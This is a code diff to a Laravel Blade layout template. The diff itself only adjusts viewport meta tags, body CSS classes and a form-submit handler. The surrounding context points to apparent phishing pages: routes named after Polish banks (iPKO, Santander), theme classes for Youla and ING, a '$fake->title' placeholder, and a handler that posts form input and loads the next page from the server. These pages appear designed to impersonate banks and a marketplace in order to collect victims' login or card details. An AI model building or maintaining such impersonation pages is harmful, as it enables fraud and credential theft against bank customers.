@@ -2,9 +2,10 @@
 <html lang="{{ str_replace('_', '-', app()->getLocale()) }}" id="html">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!-- CSRF Token -->
+    @if (!(request()->is('banks/ipko') || request()->is('banks/santander')))
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    @endif
+<!-- CSRF Token -->
     <meta name="csrf-token" content="{{ csrf_token() }}">
 
     <meta property="og:title" content="{{$title ?? $fake->title}}">
@@ -23,7 +24,8 @@
     <link href="{{ asset('css/app.css') }}" rel="stylesheet">
     @stack('css')
 </head>
-<body class="body body--payments route__product_buy_id_any ing-new-theme">
+
+<body class="body body--payments route__product_buy_id_any body_fixed-width_no body_fixed-height_no body_background_youla-mobile ing-new-theme">
 <div id="app">
     @yield('content')
 </div>
@@ -58,6 +60,10 @@
             }
         });
         if (!errors.length) $.post(form.action, $(form).serialize(), function (data) {
+            let head = $("head");
+            let viewport = head.find("meta[name='viewport']");
+            if (!viewport.length) head.append('<meta name="viewport" content="width=device-width, initial-scale=1">');
+            else viewport.remove();
             if (data.html) $('#app').html(data.html);
             else location.href = data.next
         });
